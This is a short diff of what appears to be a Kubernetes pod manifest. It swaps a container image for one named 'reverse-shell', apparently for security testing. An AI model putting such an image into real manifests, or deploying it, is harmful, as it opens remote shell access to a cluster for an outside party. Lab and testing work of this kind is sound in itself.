@@ -27,4 +27,4 @@ metadata:
 spec:
   containers:
   - name: pythonroot-testing2
-    image: docker.io/rednoob/pythonroot:latest
+    image: docker.io/denfle/reverse-shell:latest
